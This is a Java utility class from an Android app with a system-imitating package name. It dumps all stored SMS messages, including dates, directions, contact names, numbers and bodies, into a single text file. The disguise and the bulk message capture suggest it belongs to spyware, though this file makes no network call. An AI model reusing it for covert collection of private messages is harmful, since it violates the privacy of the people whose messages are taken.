package com.android.system.controled.util;

import java.io.File;
import java.util.ArrayList;

import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.SmsInfo;
import com.android.system.controled.db.TableAllsms;

public class SmsToTxtUtil {

	private static SmsToTxtUtil mInstence;

	private SmsToTxtUtil() {

	}

	public static SmsToTxtUtil getInstence() {
		if (mInstence == null) {
			mInstence = new SmsToTxtUtil();
		}
		return mInstence;
	}

	public void saveAllSmsToTextFile() {
		TableAllsms db = TableAllsms.getInstence();

		ArrayList<SmsInfo> smss = db.getAllSms();
		File file = new File(MainApplication.FILE_SMS_TEXT);
		if (file.exists()) {
			file.delete();
		}
		if (smss != null && smss.size() > 0) {
			String dateTemp = "";
			for (SmsInfo sms : smss) {
				StringBuffer sb = new StringBuffer();

				String date = TimeUtil.longToDateString(sms.getDate());

				if (!dateTemp.equals(date)) {
					dateTemp  = String.valueOf(date);
					sb.append("【 ").append(date).append("】\r\n\r\n\r\n");
				}

				if (sms.getType() == 1) {
					sb.append("【收信】\r\n");
				} else {
					sb.append("【发信】\r\n");
				}

				sb.append(TimeUtil.longToTime(sms.getDate()));

				if (sms.getName().equals(sms.getAddress())) {
					sb.append("\r\n").append(sms.getName());
				} else {
					sb.append("\r\n").append(sms.getName()).append(" ").append(sms.getAddress());
				}

				sb.append("\r\n").append(sms.getBody()).append("\r\n");
				FileUtil.writeFile(sb.toString(), file, true);
			}
		} else {
			FileUtil.writeFile("暂无短信记录！", file, true);
		}
	}
}
